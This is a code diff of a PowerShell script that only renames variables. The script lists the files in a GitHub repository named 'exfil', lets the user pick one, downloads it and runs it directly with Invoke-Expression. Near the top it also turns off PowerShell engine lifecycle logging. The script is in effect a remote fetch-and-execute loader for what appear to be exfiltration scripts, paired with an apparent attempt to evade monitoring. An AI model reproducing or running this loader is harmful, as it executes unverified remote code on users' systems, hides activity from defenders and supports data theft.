@@ -10,10 +10,10 @@ $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 
 # === GitHub Repo Info ===
-$repoOwner = "sempiampi"
-$repoName  = "exfil"
-$branch    = "main"
-$uri       = "https://api.github.com/repos/$repoOwner/$repoName/contents"
+$owner = "sempiampi"
+$repo = "exfil"
+$branch = "main"
+$uri = "https://api.github.com/repos/$owner/$repo/contents"
 
 # === Get top-level contents ===
 $response = Invoke-RestMethod -Uri $uri -Headers @{ "User-Agent" = "PowerShell" }
@@ -50,7 +50,7 @@ while ($true) {
         $selectedFolder = $folders[$selectedFolderIndex - 1].name
         while ($true) {
             # Fetch and list files in folder
-            $folderUri = "https://api.github.com/repos/$repoOwner/$repoName/contents/$selectedFolder"
+            $folderUri = "https://api.github.com/repos/$owner/$repo/contents/$selectedFolder"
             $folderResponse = Invoke-RestMethod -Uri $folderUri -Headers @{ "User-Agent" = "PowerShell" }
             $files = $folderResponse | Where-Object { $_.type -eq "file" }
             
@@ -82,7 +82,7 @@ while ($true) {
             $selectedFileIndex = [int]$selectedFileIndex
             if ($selectedFileIndex -ge 1 -and $selectedFileIndex -le $files.Count) {
                 $selectedFile = $files[$selectedFileIndex - 1].path
-                $selectedFileUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch/$selectedFile"
+                $selectedFileUrl = "https://raw.githubusercontent.com/$owner/$repo/$branch/$selectedFile"
                 Write-Host "You chose: $selectedFile" -ForegroundColor Green -BackgroundColor Black
                 $urlContent = (Invoke-WebRequest -Uri $selectedFileUrl -UseBasicParsing -Headers @{ "User-Agent" = "PowerShell" }).Content
                 Invoke-Expression $urlContent
